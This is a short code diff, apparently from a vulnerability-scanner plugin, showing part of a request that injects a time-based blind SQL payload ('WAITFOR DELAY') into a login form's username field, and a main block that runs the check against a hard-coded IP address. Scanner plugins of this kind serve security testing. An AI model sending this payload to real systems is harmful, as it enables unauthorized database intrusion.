@@ -43,5 +43,5 @@ __VIEWSTATE='''+view_state+'''&TxtUserName=asdasd');WAITFOR DELAY '0:0:'''+str(s
         security_hole(preWork)
 
 if __name__ == '__main__':
-    from dummy import *
+    
     audit(assign("soffice", 'http://117.40.152.139:800/')[1])
